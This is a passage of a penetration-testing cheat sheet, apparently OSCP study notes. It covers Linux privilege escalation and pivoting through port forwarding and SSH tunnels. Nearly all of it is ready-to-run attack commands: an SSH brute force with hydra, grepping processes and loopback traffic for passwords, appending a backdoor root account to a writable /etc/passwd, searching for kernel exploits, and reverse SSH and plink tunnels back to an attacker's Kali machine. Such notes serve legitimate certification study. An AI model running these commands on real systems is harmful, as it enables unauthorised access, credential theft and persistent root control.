</span><span id="__span-107-18"><a id="__codelineno-107-18" name="__codelineno-107-18" href="#__codelineno-107-18"></a>sudo crontab -l
</span><span id="__span-107-19"><a id="__codelineno-107-19" name="__codelineno-107-19" href="#__codelineno-107-19"></a>
</span><span id="__span-107-20"><a id="__codelineno-107-20" name="__codelineno-107-20" href="#__codelineno-107-20"></a><span class="gu">## Check the filesystem for installed cron jobs</span>
</span><span id="__span-107-21"><a id="__codelineno-107-21" name="__codelineno-107-21" href="#__codelineno-107-21"></a>grep &quot;CRON&quot; /var/log/syslog
</span><span id="__span-107-22"><a id="__codelineno-107-22" name="__codelineno-107-22" href="#__codelineno-107-22"></a>
</span><span id="__span-107-23"><a id="__codelineno-107-23" name="__codelineno-107-23" href="#__codelineno-107-23"></a><span class="gu">## Find directory/word writable by the current user</span>
</span><span id="__span-107-24"><a id="__codelineno-107-24" name="__codelineno-107-24" href="#__codelineno-107-24"></a>find / -writable -type d 2&gt;/dev/null
</span><span id="__span-107-25"><a id="__codelineno-107-25" name="__codelineno-107-25" href="#__codelineno-107-25"></a>find / -writable -type f 2&gt;/dev/null
</span><span id="__span-107-26"><a id="__codelineno-107-26" name="__codelineno-107-26" href="#__codelineno-107-26"></a>
</span><span id="__span-107-27"><a id="__codelineno-107-27" name="__codelineno-107-27" href="#__codelineno-107-27"></a><span class="gu">## Lists all drives that will be mounted at boot time</span>
</span><span id="__span-107-28"><a id="__codelineno-107-28" name="__codelineno-107-28" href="#__codelineno-107-28"></a>cat /etc/fstab
</span><span id="__span-107-29"><a id="__codelineno-107-29" name="__codelineno-107-29" href="#__codelineno-107-29"></a>
</span><span id="__span-107-30"><a id="__codelineno-107-30" name="__codelineno-107-30" href="#__codelineno-107-30"></a><span class="gu">## List all mounted filesystems</span>
</span><span id="__span-107-31"><a id="__codelineno-107-31" name="__codelineno-107-31" href="#__codelineno-107-31"></a>mount
</span><span id="__span-107-32"><a id="__codelineno-107-32" name="__codelineno-107-32" href="#__codelineno-107-32"></a>
</span><span id="__span-107-33"><a id="__codelineno-107-33" name="__codelineno-107-33" href="#__codelineno-107-33"></a><span class="gu">## List all available disks</span>
</span><span id="__span-107-34"><a id="__codelineno-107-34" name="__codelineno-107-34" href="#__codelineno-107-34"></a>lsblk
</span><span id="__span-107-35"><a id="__codelineno-107-35" name="__codelineno-107-35" href="#__codelineno-107-35"></a>
</span><span id="__span-107-36"><a id="__codelineno-107-36" name="__codelineno-107-36" href="#__codelineno-107-36"></a><span class="gu">## List loaded kernel modules</span>
</span><span id="__span-107-37"><a id="__codelineno-107-37" name="__codelineno-107-37" href="#__codelineno-107-37"></a>lsmod
</span><span id="__span-107-38"><a id="__codelineno-107-38" name="__codelineno-107-38" href="#__codelineno-107-38"></a>/sbin/modinfo [moduleName]
</span><span id="__span-107-39"><a id="__codelineno-107-39" name="__codelineno-107-39" href="#__codelineno-107-39"></a>
</span><span id="__span-107-40"><a id="__codelineno-107-40" name="__codelineno-107-40" href="#__codelineno-107-40"></a><span class="gu">## Search for SUID-marked binaries</span>
</span><span id="__span-107-41"><a id="__codelineno-107-41" name="__codelineno-107-41" href="#__codelineno-107-41"></a>find / -perm -u=s -type f 2&gt;/dev/null
</span></code></pre></div>
<p><strong>Automated Enumeration</strong></p>
<p><a href="https://pentestmonkey.net/tools/audit/unix-privesc-check">unix-privesc-check</a></p>
<p><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">PEASS-ng/linPEAS at master  peass-ng/PEASS-ng</a></p>
<p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
<h3 id="exposed-confidential-information"><strong>Exposed Confidential Information</strong></h3>
<p><strong><em>Inspecting User Trails</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="gu">## Environment variables</span>
</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a>env
</span><span id="__span-108-3"><a id="__codelineno-108-3" name="__codelineno-108-3" href="#__codelineno-108-3"></a>
</span><span id="__span-108-4"><a id="__codelineno-108-4" name="__codelineno-108-4" href="#__codelineno-108-4"></a><span class="gu">## .bashrc configuration file</span>
</span><span id="__span-108-5"><a id="__codelineno-108-5" name="__codelineno-108-5" href="#__codelineno-108-5"></a>cat .bashrc
</span><span id="__span-108-6"><a id="__codelineno-108-6" name="__codelineno-108-6" href="#__codelineno-108-6"></a>
</span><span id="__span-108-7"><a id="__codelineno-108-7" name="__codelineno-108-7" href="#__codelineno-108-7"></a><span class="gu">## Generate custom wordlist</span>
</span><span id="__span-108-8"><a id="__codelineno-108-8" name="__codelineno-108-8" href="#__codelineno-108-8"></a>crunch 6 6 -t Lab%%% &gt; wordlist
</span><span id="__span-108-9"><a id="__codelineno-108-9" name="__codelineno-108-9" href="#__codelineno-108-9"></a>
</span><span id="__span-108-10"><a id="__codelineno-108-10" name="__codelineno-108-10" href="#__codelineno-108-10"></a><span class="gu">## SSH brute force</span>
</span><span id="__span-108-11"><a id="__codelineno-108-11" name="__codelineno-108-11" href="#__codelineno-108-11"></a>hydra -l [user] -P [wordlist]  [ip] -t 4 ssh -V
</span></code></pre></div>
<p><strong><em>Inspecting Service Footprints</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a><span class="gu">## Enumerate all the running processes that contains &quot;pass&quot;</span>
</span><span id="__span-109-2"><a id="__codelineno-109-2" name="__codelineno-109-2" href="#__codelineno-109-2"></a>watch -n 1 ps -aux | grep &quot;pass&quot;
</span><span id="__span-109-3"><a id="__codelineno-109-3" name="__codelineno-109-3" href="#__codelineno-109-3"></a>
</span><span id="__span-109-4"><a id="__codelineno-109-4" name="__codelineno-109-4" href="#__codelineno-109-4"></a><span class="gu">## Capture traffic in and out of the loopback interface that contains &quot;pass&quot;</span>
</span><span id="__span-109-5"><a id="__codelineno-109-5" name="__codelineno-109-5" href="#__codelineno-109-5"></a>sudo tcpdump -i lo -A | grep &quot;pass&quot;
</span></code></pre></div>
<h3 id="insecure-file-permissions"><strong>Insecure File Permissions</strong></h3>
<p><strong><em>Abusing Cron Jobs</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a> # Check the filesystem for installed cron jobs
</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>grep &quot;CRON&quot; /var/log/syslog
</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a>
</span><span id="__span-110-4"><a id="__codelineno-110-4" name="__codelineno-110-4" href="#__codelineno-110-4"></a><span class="gu">## List all cron jobs</span>
</span><span id="__span-110-5"><a id="__codelineno-110-5" name="__codelineno-110-5" href="#__codelineno-110-5"></a>ls -lah /etc/cron*
</span><span id="__span-110-6"><a id="__codelineno-110-6" name="__codelineno-110-6" href="#__codelineno-110-6"></a>
</span><span id="__span-110-7"><a id="__codelineno-110-7" name="__codelineno-110-7" href="#__codelineno-110-7"></a><span class="gu">## List current user cron jobs</span>
</span><span id="__span-110-8"><a id="__codelineno-110-8" name="__codelineno-110-8" href="#__codelineno-110-8"></a>crontab -l
</span><span id="__span-110-9"><a id="__codelineno-110-9" name="__codelineno-110-9" href="#__codelineno-110-9"></a>sudo crontab -l
</span></code></pre></div>
<p><strong><em>Abusing Password Authentication - Word-Writable /etc/passwd</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a><span class="gu">## Locate writable files</span>
</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a>find / -writable -type d 2&gt;/dev/null
</span><span id="__span-111-3"><a id="__codelineno-111-3" name="__codelineno-111-3" href="#__codelineno-111-3"></a>find / -writable -type f 2&gt;/dev/null
</span><span id="__span-111-4"><a id="__codelineno-111-4" name="__codelineno-111-4" href="#__codelineno-111-4"></a>
</span><span id="__span-111-5"><a id="__codelineno-111-5" name="__codelineno-111-5" href="#__codelineno-111-5"></a><span class="gu">## Generate password &#39;w00t&#39;</span>
</span><span id="__span-111-6"><a id="__codelineno-111-6" name="__codelineno-111-6" href="#__codelineno-111-6"></a>openssl passwd w00t
</span><span id="__span-111-7"><a id="__codelineno-111-7" name="__codelineno-111-7" href="#__codelineno-111-7"></a>
</span><span id="__span-111-8"><a id="__codelineno-111-8" name="__codelineno-111-8" href="#__codelineno-111-8"></a><span class="gu">## Add superuser (root2)</span>
</span><span id="__span-111-9"><a id="__codelineno-111-9" name="__codelineno-111-9" href="#__codelineno-111-9"></a>echo &quot;root2:&lt;GeneratedPassword&gt;:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd
</span><span id="__span-111-10"><a id="__codelineno-111-10" name="__codelineno-111-10" href="#__codelineno-111-10"></a>
</span><span id="__span-111-11"><a id="__codelineno-111-11" name="__codelineno-111-11" href="#__codelineno-111-11"></a><span class="gu">## Authenticate as newly created superuser</span>
</span><span id="__span-111-12"><a id="__codelineno-111-12" name="__codelineno-111-12" href="#__codelineno-111-12"></a>su root2 (Pass: w00t)
</span></code></pre></div>
<h3 id="insecure-system-components"><strong>Insecure System Components</strong></h3>
<p><strong><em>Abusing Setuid Binaries and Capabilities</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a><span class="gu">## Search for SUID-marked binaries</span>
</span><span id="__span-112-2"><a id="__codelineno-112-2" name="__codelineno-112-2" href="#__codelineno-112-2"></a>find / -perm -u=s -type f 2&gt;/dev/null
</span><span id="__span-112-3"><a id="__codelineno-112-3" name="__codelineno-112-3" href="#__codelineno-112-3"></a>
</span><span id="__span-112-4"><a id="__codelineno-112-4" name="__codelineno-112-4" href="#__codelineno-112-4"></a><span class="gu">## Search linux capabilities</span>
</span><span id="__span-112-5"><a id="__codelineno-112-5" name="__codelineno-112-5" href="#__codelineno-112-5"></a>/usr/sbin/getcap -r / 2&gt;/dev/null
</span></code></pre></div>
<p><strong><em>Exploiting Kernel Vulnerabilities</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a><span class="gu">## Enumerate OS</span>
</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a>cat /etc/issue
</span><span id="__span-113-3"><a id="__codelineno-113-3" name="__codelineno-113-3" href="#__codelineno-113-3"></a>
</span><span id="__span-113-4"><a id="__codelineno-113-4" name="__codelineno-113-4" href="#__codelineno-113-4"></a><span class="gu">## Enumerate kernel</span>
</span><span id="__span-113-5"><a id="__codelineno-113-5" name="__codelineno-113-5" href="#__codelineno-113-5"></a>uname -r
</span><span id="__span-113-6"><a id="__codelineno-113-6" name="__codelineno-113-6" href="#__codelineno-113-6"></a>
</span><span id="__span-113-7"><a id="__codelineno-113-7" name="__codelineno-113-7" href="#__codelineno-113-7"></a><span class="gu">## Enumerate architecture</span>
</span><span id="__span-113-8"><a id="__codelineno-113-8" name="__codelineno-113-8" href="#__codelineno-113-8"></a>arch
</span><span id="__span-113-9"><a id="__codelineno-113-9" name="__codelineno-113-9" href="#__codelineno-113-9"></a>
</span><span id="__span-113-10"><a id="__codelineno-113-10" name="__codelineno-113-10" href="#__codelineno-113-10"></a><span class="gu">## Assume that target is Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 architecture</span>
</span><span id="__span-113-11"><a id="__codelineno-113-11" name="__codelineno-113-11" href="#__codelineno-113-11"></a>searchsploit &quot;linux kernel Ubuntu 16 Local Privilege Escalation&quot;   | grep  &quot;4.&quot; | grep -v &quot; &lt; 4.4.0&quot; | grep -v &quot;4.8&quot;
</span></code></pre></div>
<p><strong><em>Linux Privilege Escalation References:</em></strong></p>
<p><a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/">Linux - Privilege Escalation - Internal All The Things</a></p>
<p><a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html">Linux Privilege Escalation - HackTricks</a></p>
<p>[apt get</p>
<div class="language-text highlight"><pre><span></span><code>        |

        GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/)
</code></pre></div>
<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation - g0tmi1k</a></p>
<hr />
<h2 id="port-redirection-and-ssh-tunneling"><strong>Port Redirection and SSH Tunneling</strong></h2>
<h3 id="port-forwarding-with-linux-tools"><strong>Port Forwarding with Linux Tools</strong></h3>
<h4 id="port-forwarding-with-socat"><strong>Port Forwarding with Socat</strong></h4>
<p><strong><em>Forward 2345 port to 5432 postgresql</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>socat<span class="w"> </span>TCP-LISTEN:2345,fork<span class="w"> </span>TCP:10.10.10.10:5432
</span></code></pre></div>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%201.png" /></p>
<p><strong><em>Forward 2222 port to 22 SSH</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>socat<span class="w"> </span>TCP-LISTEN:2222,fork<span class="w"> </span>TCP:10.10.10.10:22
</span></code></pre></div>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%202.png" /></p>
<h3 id="ssh-tunneling"><strong>SSH Tunneling</strong></h3>
<h4 id="ssh-local-port-forwarding"><strong>SSH Local Port Forwarding</strong></h4>
<p><strong><em>SSH Port Forwarding</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span><span class="o">[</span>LOCAL_IP:<span class="o">]</span>LOCAL_PORT:DEST_IP:DEST_PORT<span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>IP<span class="o">]</span>
</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2" href="#__codelineno-116-2"></a>
</span><span id="__span-116-3"><a id="__codelineno-116-3" name="__codelineno-116-3" href="#__codelineno-116-3"></a><span class="c1">## Example</span>
</span><span id="__span-116-4"><a id="__codelineno-116-4" name="__codelineno-116-4" href="#__codelineno-116-4"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span><span class="m">0</span>.0.0.0:4455:172.16.50.217:445<span class="w"> </span>database_admin@10.4.50.215
</span></code></pre></div>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%203.png" /></p>
<p><strong><em>Find open ports without scanning tools</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">254</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>nc<span class="w"> </span>-zv<span class="w"> </span>-w<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">10</span>.10.10.<span class="nv">$i</span><span class="w"> </span><span class="m">445</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
</span></code></pre></div>
<p><strong><em>Connect forwarded SMB port with smbmap</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>smbclient<span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>port<span class="o">]</span><span class="w">  </span>-L<span class="w"> </span>//<span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>--user<span class="w"> </span><span class="o">[</span>user<span class="o">]</span><span class="w"> </span>--password<span class="w"> </span><span class="o">[</span>pass<span class="o">]</span>
</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a>
</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#__codelineno-118-3"></a>smbclient<span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>port<span class="o">]</span><span class="w">  </span>//<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>share<span class="o">]</span><span class="w"> </span>--user<span class="w"> </span><span class="o">[</span>user<span class="o">]</span><span class="w"> </span>--password<span class="w"> </span><span class="o">[</span>pass<span class="o">]</span>
</span></code></pre></div>
<h4 id="ssh-dynamic-port-forwarding"><strong>SSH Dynamic Port Forwarding</strong></h4>
<p><strong><em>SSH Dynamic Port Forwarding</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-D<span class="w"> </span><span class="o">[</span>LOCAL_IP:<span class="o">]</span>LOCAL_PORT<span class="o">]</span><span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>IP<span class="o">]</span>
</span><span id="__span-119-2"><a id="__codelineno-119-2" name="__codelineno-119-2" href="#__codelineno-119-2"></a>
</span><span id="__span-119-3"><a id="__codelineno-119-3" name="__codelineno-119-3" href="#__codelineno-119-3"></a><span class="c1">## Example</span>
</span><span id="__span-119-4"><a id="__codelineno-119-4" name="__codelineno-119-4" href="#__codelineno-119-4"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-D<span class="w"> </span><span class="m">0</span>.0.0.0:9999<span class="w"> </span>database_admin@10.4.50.215
</span><span id="__span-119-5"><a id="__codelineno-119-5" name="__codelineno-119-5" href="#__codelineno-119-5"></a>
</span><span id="__span-119-6"><a id="__codelineno-119-6" name="__codelineno-119-6" href="#__codelineno-119-6"></a><span class="c1">## Modify proxychains4.conf</span>
</span><span id="__span-119-7"><a id="__codelineno-119-7" name="__codelineno-119-7" href="#__codelineno-119-7"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;socks5 [IP] [PORT]&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/proxychains4.conf
</span></code></pre></div>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%204.png" /></p>
<h4 id="ssh-remote-port-forwarding"><strong>SSH Remote Port Forwarding</strong></h4>
<p><strong><em>SSH Remote Port Forwarding</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a><span class="c1">## Kali - Attacker VM</span>
</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a>sudo<span class="w"> </span>systemctl<span class="w"> </span>start<span class="w"> </span>ssh
</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3" href="#__codelineno-120-3"></a>sudo<span class="w"> </span>ss<span class="w"> </span>-ntplu
</span><span id="__span-120-4"><a id="__codelineno-120-4" name="__codelineno-120-4" href="#__codelineno-120-4"></a>
</span><span id="__span-120-5"><a id="__codelineno-120-5" name="__codelineno-120-5" href="#__codelineno-120-5"></a><span class="c1">## Remote VM</span>
</span><span id="__span-120-6"><a id="__codelineno-120-6" name="__codelineno-120-6" href="#__codelineno-120-6"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-R<span class="w"> </span>LOCAL_IP:LOCAL_PORT:DEST_IP:DEST_PORT<span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>KALI_IP<span class="o">]</span>
</span><span id="__span-120-7"><a id="__codelineno-120-7" name="__codelineno-120-7" href="#__codelineno-120-7"></a>
</span><span id="__span-120-8"><a id="__codelineno-120-8" name="__codelineno-120-8" href="#__codelineno-120-8"></a><span class="c1">## Example</span>
</span><span id="__span-120-9"><a id="__codelineno-120-9" name="__codelineno-120-9" href="#__codelineno-120-9"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-R<span class="w"> </span><span class="m">127</span>.0.0.1:2345:10.4.50.215:5432<span class="w"> </span>kali@192.168.118.4
</span></code></pre></div>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%205.png" /></p>
<p><strong><em>Authenticate Through Public Key Authentication</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a><span class="c1">## Modify /etc/ssh/sshd_config to enable Public Key Authentication</span>
</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a>PubkeyAuthentication<span class="w"> </span>yes
</span><span id="__span-121-3"><a id="__codelineno-121-3" name="__codelineno-121-3" href="#__codelineno-121-3"></a>
</span><span id="__span-121-4"><a id="__codelineno-121-4" name="__codelineno-121-4" href="#__codelineno-121-4"></a><span class="c1">## Generate Private/Public Keys</span>
</span><span id="__span-121-5"><a id="__codelineno-121-5" name="__codelineno-121-5" href="#__codelineno-121-5"></a>ssh-keygen<span class="w"> </span>-f<span class="w"> </span>key
</span><span id="__span-121-6"><a id="__codelineno-121-6" name="__codelineno-121-6" href="#__codelineno-121-6"></a>
</span><span id="__span-121-7"><a id="__codelineno-121-7" name="__codelineno-121-7" href="#__codelineno-121-7"></a><span class="c1">## Copy *key.pub* in *authorized_keys* </span>
</span><span id="__span-121-8"><a id="__codelineno-121-8" name="__codelineno-121-8" href="#__codelineno-121-8"></a><span class="c1">## Authenticate</span>
</span><span id="__span-121-9"><a id="__codelineno-121-9" name="__codelineno-121-9" href="#__codelineno-121-9"></a>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>key
</span><span id="__span-121-10"><a id="__codelineno-121-10" name="__codelineno-121-10" href="#__codelineno-121-10"></a>ssh<span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>-i<span class="w"> </span>key2
</span></code></pre></div>
<h4 id="ssh-remote-dynamic-port-forwarding"><strong>SSH Remote Dynamic Port Forwarding</strong></h4>
<p><strong><em>SSH Remote Dynamic Port Forwarding</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-R<span class="w"> </span>LOCAL_PORT<span class="w"> </span>kali@<span class="o">[</span>KALI_IP<span class="o">]</span>
</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#__codelineno-122-2"></a>
</span><span id="__span-122-3"><a id="__codelineno-122-3" name="__codelineno-122-3" href="#__codelineno-122-3"></a><span class="c1">## Example</span>
</span><span id="__span-122-4"><a id="__codelineno-122-4" name="__codelineno-122-4" href="#__codelineno-122-4"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-R<span class="w"> </span><span class="m">9998</span><span class="w"> </span>kali@192.168.118.4
</span><span id="__span-122-5"><a id="__codelineno-122-5" name="__codelineno-122-5" href="#__codelineno-122-5"></a>
</span><span id="__span-122-6"><a id="__codelineno-122-6" name="__codelineno-122-6" href="#__codelineno-122-6"></a><span class="c1">## Modify proxychains4.conf</span>
</span><span id="__span-122-7"><a id="__codelineno-122-7" name="__codelineno-122-7" href="#__codelineno-122-7"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;socks5 127.0.0.1 [PORT]&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/proxychains4.conf
</span></code></pre></div>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image%206.png" /></p>
<h4 id="using-sshuttle"><strong>Using sshuttle</strong></h4>
<p><strong><em>Pivoting using sshuttle</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a><span class="c1">## Set up SSH port forwarding with socat or SSH</span>
</span><span id="__span-123-2"><a id="__codelineno-123-2" name="__codelineno-123-2" href="#__codelineno-123-2"></a>socat<span class="w"> </span>TCP-LISTEN:2222,fork<span class="w"> </span>TCP:<span class="o">[</span>IP<span class="o">]</span>:22
</span><span id="__span-123-3"><a id="__codelineno-123-3" name="__codelineno-123-3" href="#__codelineno-123-3"></a>
</span><span id="__span-123-4"><a id="__codelineno-123-4" name="__codelineno-123-4" href="#__codelineno-123-4"></a>ssh<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span><span class="o">[</span>LOCAL_IP:<span class="o">]</span>LOCAL_PORT:DEST_IP:DEST_PORT<span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>IP<span class="o">]</span>
</span><span id="__span-123-5"><a id="__codelineno-123-5" name="__codelineno-123-5" href="#__codelineno-123-5"></a>
</span><span id="__span-123-6"><a id="__codelineno-123-6" name="__codelineno-123-6" href="#__codelineno-123-6"></a><span class="c1">## Use sshuttle to tunnel through the subnets </span>
</span><span id="__span-123-7"><a id="__codelineno-123-7" name="__codelineno-123-7" href="#__codelineno-123-7"></a>sshuttle<span class="w"> </span>-r<span class="w"> </span><span class="o">[</span>user<span class="o">]</span>@<span class="o">[</span>IP<span class="o">]</span>:2222<span class="w"> </span><span class="m">10</span>.10.10.0/24<span class="w"> </span><span class="m">11</span>.11.11.0/24
</span></code></pre></div>
<p><a href="https://github.com/sshuttle/sshuttle">https://github.com/sshuttle/sshuttle</a></p>
<h3 id="port-forwarding-with-windows-tools"><strong>Port Forwarding with Windows Tools</strong></h3>
<h4 id="sshexe"><strong>ssh.exe</strong></h4>
<aside>


***SSH utilities -* %systemdrive%\Windows\System32\OpenSSH**

</aside>

<aside>


OpenSSH higher than 7.6 can use be used for remote dynamic port forwarding.

</aside>

<p><strong><em>SSH Remote Dynamic Port Forwarding</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a><span class="c">## Locate SSH</span>
</span><span id="__span-124-2"><a id="__codelineno-124-2" name="__codelineno-124-2" href="#__codelineno-124-2"></a><span class="nb">where </span><span class="n">ssh</span>
</span><span id="__span-124-3"><a id="__codelineno-124-3" name="__codelineno-124-3" href="#__codelineno-124-3"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">OpenSSH</span>
</span><span id="__span-124-4"><a id="__codelineno-124-4" name="__codelineno-124-4" href="#__codelineno-124-4"></a>
</span><span id="__span-124-5"><a id="__codelineno-124-5" name="__codelineno-124-5" href="#__codelineno-124-5"></a><span class="c">## Remote Dynamic Port Forwarding </span>
</span><span id="__span-124-6"><a id="__codelineno-124-6" name="__codelineno-124-6" href="#__codelineno-124-6"></a><span class="n">ssh</span><span class="p">.</span><span class="n">exe</span> <span class="n">-N</span> <span class="n">-R</span> <span class="n">9998</span> <span class="n">kali</span><span class="p">@</span><span class="no">[IP]</span>
</span><span id="__span-124-7"><a id="__codelineno-124-7" name="__codelineno-124-7" href="#__codelineno-124-7"></a>
</span><span id="__span-124-8"><a id="__codelineno-124-8" name="__codelineno-124-8" href="#__codelineno-124-8"></a><span class="c">## Update proxychains4.conf</span>
</span><span id="__span-124-9"><a id="__codelineno-124-9" name="__codelineno-124-9" href="#__codelineno-124-9"></a><span class="nb">echo </span><span class="s2">&quot;socks5 127.0.0.1 [PORT]&quot;</span> <span class="p">&gt;&gt;</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">proxychains4</span><span class="p">.</span><span class="n">conf</span>
</span></code></pre></div>
<h4 id="plink">Plink</h4>
<aside>


Plink doesn't have is remote dynamic port forwarding

</aside>

<p><strong><em>Plink Remote Port Forwarding</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">tmp</span><span class="p">\</span><span class="n">plink</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ssh</span> <span class="n">-l</span> <span class="no">[user]</span> <span class="n">-pw</span> <span class="p">&lt;</span><span class="n">YOUR</span> <span class="n">PASSWORD</span> <span class="n">HERE</span><span class="p">&gt;</span> <span class="n">-R</span> <span class="p">[</span><span class="n">LOCAL_IP</span><span class="p">:]</span><span class="n">LOCAL_PORT</span><span class="p">:</span><span class="n">DEST_IP</span><span class="p">:</span><span class="n">DEST_PORT</span> <span class="no">[Attacker IP]</span>
</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2" href="#__codelineno-125-2"></a>
</span><span id="__span-125-3"><a id="__codelineno-125-3" name="__codelineno-125-3" href="#__codelineno-125-3"></a><span class="c">## Example</span>
